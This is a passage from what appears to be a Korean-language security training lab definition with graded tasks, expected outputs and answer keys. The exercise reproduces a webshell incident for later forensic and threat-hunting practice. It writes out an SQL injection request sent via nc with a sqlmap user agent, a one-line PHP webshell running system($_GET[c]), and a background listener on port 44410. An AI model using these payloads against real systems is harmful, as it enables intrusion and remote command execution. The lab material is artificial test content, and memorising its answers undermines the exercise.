      ssh ccc@10.20.32.80 'sudo ls /var/log/apache2/dvwa_access.log /var/log/apache2/modsec_audit.log'
      # 2) osquery 동작 확인(버전) — 헌팅 무대
      ssh ccc@10.20.32.80 sudo osqueryi --version
    answer_detail: "웹쉘 대응의 두 축을 점검한다 — 포렌식의 무대인 웹 로그(access.log: 무엇이 들어왔나 + modsec_audit.log: 왜 막혔나)와 헌팅의 무대인 osquery(호스트를 SQL로 조회). osqueryi 버전(5.23대)이 출력되면 헌팅 가능. 둘 중 하나라도 없으면 그 분석 축을 못 쓴다."
    expected_output: |
      /var/log/apache2/dvwa_access.log
      /var/log/apache2/modsec_audit.log
      osqueryi version 5.23.0
    verify:
      type: output_contains
      expect: '5.23'
      field: stdout
      semantic:
        intent: "웹 로그 + osquery 점검"
        success_criteria: ["access/audit + osquery"]
        acceptable_methods: ["**[OSS] 점검 (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표 — 분석 대상이 될 웹쉘 침해를 직접 재현
      ## 📖 개념 한 줄
      웹쉘 침해는 세 구성요소로 이뤄진다 — **SQLi 침투**(취약점으로 발 들이기) + **웹쉘 파일**
      (디스크에 떨어진 .php) + **콜백 리스너**(외부 통신 채널). 이 셋을 통제된 환경에서 재현해,
      이후 포렌식·헌팅이 읽어낼 흔적(로그)과 실체(파일·포트)를 만든다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** 침투는 `외부 공격자 VM 192.168.0.202`, 웹쉘·리스너는 `el34-web`.
      각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.

      ```bash
      # ── 외부 공격자 VM 192.168.0.202 에서: SQLi 침투 — sqlmap UA 주입(ModSec 942 탐지) ──
      echo -en 'GET /?id=socw10%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null
      # ── el34-web 에서: 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주 ──
      echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted
      # 로그 수렴 대기 후 완료 마커
      sleep 5
      echo "webshell incident done"
      ```
      - 1) sqlmap UA SQLi 는 ModSec 942 로 탐지. 2) 한 줄짜리 `system($_GET[c])` 웹쉘 + `nohup ... &` 로 콜백 리스너 백그라운드 상주.

      ## ✅ 합격 기준
      `done` 출력 시 통과. **근거:** 세 요소(SQLi 요청·웹쉘 파일·44410 리스너)가 만들어지고
      webshell incident done 이 나오면 통과 — 하나라도 빠지면 이후 분석에서 그 흔적이 안 보인다.
    hint: 'SQLi + 웹쉘 파일 + 콜백 리스너(44410)'
    category: recon
    points: 10
    answer: |
      # 1) SQLi 침투 — sqlmap UA로 주입(ModSec 942 탐지)
      ssh att@192.168.0.202 "echo -en 'GET /?id=socw10%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null"
      # 2) 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주
      ssh ccc@10.20.32.80 'echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted'
      # 3) 로그 수렴 대기 후 완료 마커
      sleep 5
      echo "webshell incident done"
    answer_detail: "웹쉘 침해의 세 구성요소를 재현한다 — SQLi 침투(sqlmap UA 요청, ModSec 942로 탐지) + 웹쉘 파일(/tmp/socw10_shell.php, system($_GET[c]) 한 줄) + 콜백 리스너(비표준 포트 44410). 이 셋이 각각 웹 로그·디스크·네트워크에 흔적을 남겨 이후 모든 포렌식·헌팅 미션의 원천 데이터가 된다. 검증을 단순화하려 UNION SELECT 1로 침투를 재현하되 웹쉘 파일·리스너 배치는 동일하다."
    expected_output: |
      planted
      webshell incident done
    verify:
      type: output_contains
      expect: 'done'
      field: stdout
      semantic:
        intent: "웹쉘 침해 재현"
        success_criteria: ["SQLi + 웹쉘 + 콜백"]
